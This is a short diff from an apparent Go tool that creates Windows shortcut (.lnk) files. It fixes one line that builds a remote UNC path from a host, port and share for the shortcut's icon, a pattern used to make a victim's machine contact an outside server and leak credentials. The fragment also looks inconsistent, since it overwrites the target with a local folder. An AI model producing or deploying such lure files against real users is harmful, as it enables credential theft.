@@ -22,7 +22,7 @@ func CreateLNK(target string, output string, description string, port string, sh
 
 	// Set the target path
 	target = "%USERPROFILE%\\Documents"
-	targetIco = "\\\\" + target + "@" + port + "\\" + share
+	targetIco := "\\\\" + target + "@" + port + "\\" + share
 
 	// Record the start time
 	LNKCreationStartTime := time.Now()
